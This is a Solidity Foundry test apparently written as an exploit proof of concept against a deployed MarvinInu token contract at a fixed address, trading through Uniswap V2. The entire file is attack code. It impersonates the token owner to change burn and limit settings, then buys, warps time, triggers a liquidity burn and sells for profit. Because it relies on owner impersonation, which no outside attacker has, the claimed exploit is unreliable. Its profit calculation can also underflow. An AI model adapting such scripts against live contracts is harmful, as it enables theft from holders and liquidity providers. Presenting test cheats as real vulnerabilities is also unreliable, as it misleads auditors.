pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Minimal IERC20 interface for WETH
interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

// Uniswap Router interface with only needed functions
interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

// MarvinInu interface with needed functions
interface MarvinInu {
    function uniswapV2Pair() external view returns (address);
    function enableTrading() external;
    function setAutoLPBurnSettings(uint256 _frequencyInSeconds, uint256 _percent, bool _Enabled) external;
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function removeLimits() external;
    function disableTransferDelay() external;
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x55a380d134d722006A5CE2d510562e1239D225B1;
    address attacker = address(this);
    // Store contract instances
    MarvinInu token;
    IUniswapV2Router02 router;
    address weth;
    address tokenOwner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: Get the contract instance and label addresses
        token = MarvinInu(TARGET);
        router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        weth = router.WETH();

        // Label addresses for debugging
        vm.label(address(token), "MarvinInu Token");
        vm.label(address(router), "Uniswap Router");
        vm.label(token.uniswapV2Pair(), "Uniswap Pair");

        // Get owner address from storage (slot 0 for Ownable)
        bytes32 ownerSlot = vm.load(address(token), bytes32(uint256(0)));
        tokenOwner = address(uint160(uint256(ownerSlot)));
        vm.label(tokenOwner, "Token Owner");

        // Give attacker ETH for trading
        deal(attacker, 100 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Impersonate owner to enable trading and remove limits
        vm.startPrank(tokenOwner);
        token.enableTrading();
        // Set burn frequency to minimum (600 seconds) and percent to maximum (10%)
        token.setAutoLPBurnSettings(600, 1000, true);
        // Remove limits for easier trading
        token.removeLimits();
        token.disableTransferDelay();
        vm.stopPrank();

        // Step 2: Buy tokens - need to approve router first
        vm.startPrank(attacker);

        // Get initial ETH balance for profit calculation
        uint256 initialEthBalance = attacker.balance;

        // Buy a smaller amount to avoid limits
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = address(token);

        uint256 amountIn = 1 ether; // Smaller amount
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amountIn}(
            0,
            path,
            attacker,
            block.timestamp
        );

        uint256 tokenBalanceBefore = token.balanceOf(attacker);
        console.log("Token balance after buy:", tokenBalanceBefore);
        console.log("Initial ETH spent:", amountIn);

        // Step 3: Warp time to trigger burn
        vm.warp(block.timestamp + 601); // Just over 600 seconds

        // Step 4: Trigger the burn by selling a very small amount
        // First approve token transfer for the router
        token.approve(address(router), type(uint256).max);

        address[] memory sellPath = new address[](2);
        sellPath[0] = address(token);
        sellPath[1] = weth;

        // Sell a tiny amount to trigger the burn (1% of balance)
        uint256 triggerAmount = tokenBalanceBefore / 100;
        if (triggerAmount == 0) triggerAmount = 1;

        console.log("Triggering burn with amount:", triggerAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            triggerAmount,
            0,
            sellPath,
            attacker,
            block.timestamp
        );

        console.log("Burn should be triggered now");

        // Step 5: Sell remaining tokens to profit
        uint256 remainingTokens = token.balanceOf(attacker);
        console.log("Remaining tokens to sell:", remainingTokens);

        // Sell in smaller chunks if needed
        uint256 chunkSize = remainingTokens;
        if (chunkSize > 0) {
            router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                chunkSize,
                0,
                sellPath,
                attacker,
                block.timestamp
            );
        }

        uint256 finalEthBalance = attacker.balance;
        uint256 profit = finalEthBalance - initialEthBalance;
        console.log("Final ETH balance:", finalEthBalance);
        console.log("Profit/Loss:", profit);

        // Verify we made profit (or at least increased balance)
        assertGt(finalEthBalance, initialEthBalance, "Should have increased ETH balance");

        vm.stopPrank();
    }

    // No helper functions needed


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

